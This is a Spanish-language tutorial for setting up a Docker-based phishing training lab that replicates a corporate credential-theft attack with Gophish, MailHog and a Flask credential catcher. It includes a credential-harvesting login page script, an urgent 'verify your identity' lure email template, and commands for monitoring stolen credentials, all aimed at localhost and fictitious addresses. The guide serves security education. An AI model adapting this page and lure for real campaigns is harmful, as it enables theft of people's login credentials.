🧪# Guía Técnica: Laboratorio de Phishing Endesa

### 📌 **Resumen del Objetivo**

Construir un entorno educativo y aislado con Docker que simule el flujo completo de un ataque de phishing corporativo:

1. **Phishing**: Envío de correos falsos (Gophish + MailHog).
2. **Captura**: Robo de credenciales mediante página fraudulenta (Flask).


## Réplica del Caso Endesa (Acceso a Sistemas Internos vía Phishing)



### 🗺️ **Arquitectura del Laboratorio**



```bash

laboratorio-phishing/
├── docker-compose.yml # Orquestación de servicios
├── credential_server/
│ ├── app.py # Servidor Flask capturador
│ ├── Dockerfile
│ ├── requirements.txt
│ └── credenciales_robadas.txt # Credenciales capturadas
└── internal_data/
└── secreto.txt # Datos "confidenciales" simulados

```


### ⚠️ Servicios Docker: 

- Gophish (:3333, :8080) - Plataforma de phishing ético

- MailHog (:8025, :1025) - Servidor SMTP de pruebas

- Flask Capturador (:5000) - Servidor que captura credenciales

- Nginx Interno - Sistema "corporativo" simulado



### ⚡ Instalación Rápida

Prerrequisitos


```bash
# 1. Instalar Docker y Docker Compose
sudo apt update

sudo apt install docker.io docker-compose

# 2. Clonar repositorio
git clone https://github.com/TU_USUARIO/laboratorio-phishing.git

cd laboratorio-phishing


```

### 💥  Instalación Automática

```bash
docker-compose up --build -d
```

### 🚀 Uso Paso a Paso


## Paso 1: Iniciar el Laboratorio

```bash
# Levantar todos los servicios
docker-compose up -d

# Verificar estado
docker-compose ps

```

Salida esperada:

```bash
text
NAME                 STATUS              PORTS
phishing-server      Up 2 minutes        0.0.0.0:3333->3333/tcp, 0.0.0.0:8080->80/tcp
credential-catcher   Up 2 minutes        0.0.0.0:5000->5000/tcp
mailhog-server       Up 2 minutes        0.0.0.0:1025->1025/tcp, 0.0.0.0:8025->8025/tcp
internal-server      Up 2 minutes        80/tcp

```

## Paso 2: Configurar Gophish

Acceder al panel: https://localhost:3333

Credenciales iniciales: Buscar en logs:

```bash
docker-compose logs gophish | grep "admin password"
```

Configurar Sending Profile:

- Name: MailHog Local

- Host: mailhog:1025

- From: soporte@empresacorp.lab

- ✅ Ignore Certificate Errors

## Paso 3: Crear Landing Page de Phishing

Código HTML crítico (el action debe ser exacto):

```html

<!DOCTYPE html><html><head></head><body>
<h2>Portal Corporativo</h2>
<div id="loginForm">
    Usuario:<br/>
    <input type="text" id="username" name="username"/><br/>
    Contraseña:<br/>
    <input type="password" id="password" name="password"/><br/><br/>
    <button onclick="enviarCredenciales()">Ingresar</button>
</div>

<script>
function enviarCredenciales() {
    var user = document.getElementById('username').value;
    var pass = document.getElementById('password').value;
    
    // Crear formulario dinámico
    var form = document.createElement('form');
    form.method = 'POST';
    form.action = 'http://localhost:5000/login';
    
    // Campo usuario
    var inputUser = document.createElement('input');
    inputUser.type = 'hidden';
    inputUser.name = 'username';
    inputUser.value = user;
    form.appendChild(inputUser);
    
    // Campo contraseña
    var inputPass = document.createElement('input');
    inputPass.type = 'hidden';
    inputPass.name = 'password';
    inputPass.value = pass;
    form.appendChild(inputPass);
    
    // Enviar
    document.body.appendChild(form);
    form.submit();
}
</script>

</body></html>

```

## Paso 4: Crear Email Template


```bash

Hola {{.FirstName}},

El sistema ha detectado un problema de acceso a tu cuenta.

Fecha/Hora: [FECHA_ACTUAL]
Ubicación: Berlín, Alemania
Dispositivo: Windows 10 / Chrome 122
Estado: Pendiente de verificación

Por favor, verifica tu identidad aquí: {{.URL}}

```

Variables válidas de Gophish: {{.FirstName}}, {{.URL}}, {{.RId}} 🧠


## Paso 5: Crear y Lanzar Campaña


 Campo           | Valor                  |
|-----------------|------------------------|
| URL             | http://localhost:8080  |
| Landing Page    | Página configurada     |
| Sending Profile | MailHog Local          |
| Email Template  | Plantilla seleccionada |
| Grupos          | Correos de prueba      |


¡Haz clic en "Launch Campaign"!


### 🔍 Flujo de Ataque Simulado

## 1. 📧 El Correo de Phishing

```bash
# Ver correos en MailHog
xdg-open http://localhost:8025

```

Características del correo:

- Remitente: seguridad@empresacorp.lab

- Asunto urgente con {{.RId}}

- Enlace personalizado {{.URL}}

## 2. 🎣 La Página Fraudulenta

```bash
# Acceder a la página de phishing
xdg-open "http://localhost:8080?rid=ABCD123"
```

Verifica que:

- El formulario se vea profesional

- El action apunte a localhost:5000/login

- No haya errores en consola (F12 → Console)


### 3. 🕵️ Captura de Credenciales

```bashbash
# Monitorear captura en tiempo real
tail -f credential_server/credenciales_robadas.txt
```

```bash
# Ver logs del capturador
docker-compose logs -f credential-catcher
```

Cuando una víctima introduce credenciales:

```bash
[!] Credenciales capturadas - Usuario: admin, Contraseña: P@ssw0rd123

```

## ⚠️ Consideraciones Éticas

## ✅ Prácticas Aceptables

- Uso en máquinas virtuales aisladas

- Datos 100% ficticios (@empresacorp.lab, credenciales inventadas)

- Fines educativos demostrativos

- Investigación autorizada en redes propias


## 📜 Declaración Legal

```bash
Este software se proporciona "TAL CUAL", sin garantías de ningún tipo.
El autor no se hace responsable del uso indebido. Usted es el único
responsable de cumplir con todas las leyes locales, estatales y nacionales.

```